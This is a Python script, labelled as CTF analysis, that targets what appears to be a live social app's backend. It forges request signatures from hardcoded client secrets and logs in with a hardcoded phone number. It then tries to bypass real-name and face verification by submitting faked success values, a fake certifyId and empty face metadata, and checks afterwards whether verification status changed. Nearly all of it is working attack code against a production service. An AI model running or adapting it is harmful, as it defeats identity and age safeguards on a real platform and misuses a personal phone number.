#!/usr/bin/env python3
"""Probe real-name (RP) verification related APIs. CTF protocol analysis only."""

from __future__ import annotations

import hashlib
import json
import time
import urllib.error
import urllib.parse
import urllib.request
from typing import Dict, Tuple

PHONE = "19122614669"
PASSWORD = "YOUR_PASSWORD"  # set locally; do not commit real secrets
UID_HINT = "726285"
BASE = "https://applet.banghua.xin/app/index.php"


def md5_hex(s: str) -> str:
    return hashlib.md5(bytes(ord(c) & 0xFF for c in s)).hexdigest()


def sha1_hex(s: str) -> str:
    return hashlib.sha1(s.encode("utf-8")).hexdigest()


def expire_token() -> str:
    t = str(int(time.time()))
    return sha1_hex("xiaobei" + t) + t


def headers(uid: str, token: str) -> Dict[str, str]:
    return {
        "AUTHOR-TOKEN": token,
        "EXPIRE-TOKEN": expire_token(),
        "SIGN-TOKEN": md5_hex(uid + "socialchat" + uid),
        "User-Agent": "okhttp/4.9.3 beibeiwu/154",
        "Content-Type": "application/x-www-form-urlencoded",
    }


def post(url: str, body: Dict[str, str], uid: str, token: str) -> Tuple[int, str]:
    data = urllib.parse.urlencode(body).encode("utf-8")
    req = urllib.request.Request(url, data=data, headers=headers(uid, token), method="POST")
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            return resp.status, resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace")
    except Exception as e:
        return -1, f"EXC: {e}"


def show(label: str, status: int, raw: str) -> None:
    print("=" * 72)
    print(f"[{label}] HTTP {status}")
    print(raw[:1500] if raw else "<empty>")
    print()


def login() -> Tuple[str, str, dict]:
    st, raw = post(
        f"{BASE}?i=999999&c=entry&a=webapp&do=signin0&m=socialchat",
        {
            "userAccount": PHONE,
            "userPassword": PASSWORD,
            "uniquelogintoken": sha1_hex("xiaobei" + UID_HINT),
            "phonebrand": "Android",
            "pushregid": "rp_probe",
            "version_code": "154",
        },
        "0",
        "0",
    )
    show("signin0", st, raw)
    j = json.loads(raw)
    info = json.loads(j["json"])
    return info["id"], info["token"], info


def reset_new(uid: str, token: str, nick: str = "Vom") -> None:
    boundary = "----WebKitFormBoundaryRP"
    fields = {
        "sign": md5_hex(uid + "socialchat" + uid),
        "type": "昵称设置",
        "userId": uid,
        "value": nick,
    }
    lines = []
    for k, v in fields.items():
        lines.extend(
            [
                f"--{boundary}",
                f'Content-Disposition: form-data; name="{k}"',
                "",
                v,
            ]
        )
    lines.extend([f"--{boundary}--", ""])
    body = "\r\n".join(lines).encode("utf-8")
    req = urllib.request.Request(
        f"{BASE}?i=999999&c=entry&a=webapp&do=resetNew&m=socialchat",
        data=body,
        headers={
            "AUTHOR-TOKEN": token,
            "EXPIRE-TOKEN": expire_token(),
            "SIGN-TOKEN": md5_hex(uid + "socialchat" + uid),
            "User-Agent": "okhttp/4.9.3 beibeiwu/154",
            "Content-Type": f"multipart/form-data; boundary={boundary}",
        },
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            show("resetNew", resp.status, resp.read().decode("utf-8", errors="replace"))
    except urllib.error.HTTPError as e:
        show("resetNew", e.code, e.read().decode("utf-8", errors="replace"))
    except Exception as e:
        show("resetNew", -1, str(e))


def main() -> None:
    uid, token, before = login()
    print(
        "BEFORE rp_verify_time=",
        before.get("rp_verify_time"),
        "nickname=",
        before.get("nickname"),
    )

    # A) SaveRPVerifyInfo — does server accept client-asserted result without face?
    # Using non-PII placeholder strings; purpose is to see validation response only.
    for result in ("T", "F", "true", "1", "PASS", "success", "200", "Y"):
        st, raw = post(
            f"{BASE}?i=888&c=entry&a=webapp&do=SaveRPVerifyInfo&m=socialchat",
            {
                "id": uid,
                "cert_name": "PROBE",
                "cert_no": "000000000000000000",
                "result": result,
            },
            uid,
            token,
        )
        show(f"SaveRPVerifyInfo result={result!r}", st, raw)

    # B) DescribeFaceVerify without real certifyId
    st, raw = post(
        "https://applet.banghua.xin/otherinterface/aliyun/DescribeFaceVerify0.php",
        {
            "id": uid,
            "cert_name": "PROBE",
            "cert_no": "000000000000000000",
            "certifyId": "fake-certify-id",
        },
        uid,
        token,
    )
    show("DescribeFaceVerify0 fake certifyId", st, raw)

    # C) InitFaceVerify with empty/fake meta
    st, raw = post(
        "https://applet.banghua.xin/otherinterface/aliyun/InitFaceVerify0.php",
        {
            "metaInfo": "{}",
            "certNo": "000000000000000000",
            "certName": "PROBE",
        },
        uid,
        token,
    )
    show("InitFaceVerify0 fake", st, raw)

    # D) checkAge
    st, raw = post(
        f"{BASE}?i=999999&c=entry&a=webapp&do=checkAge&m=socialchat",
        {"certNo": "000000000000000000"},
        uid,
        token,
    )
    show("checkAge", st, raw)

    # E) re-login + resetNew to see if anything stuck
    uid2, token2, after = login()
    print(
        "AFTER rp_verify_time=",
        after.get("rp_verify_time"),
        "nickname=",
        after.get("nickname"),
    )
    reset_new(uid2, token2, "Vom")

    with open(
        r"D:\project\AI\bbw\analysis\rp_verify_probe_result.json",
        "w",
        encoding="utf-8",
    ) as f:
        json.dump(
            {
                "before_rp": before.get("rp_verify_time"),
                "after_rp": after.get("rp_verify_time"),
                "nickname": after.get("nickname"),
            },
            f,
            ensure_ascii=False,
            indent=2,
        )


if __name__ == "__main__":
    main()
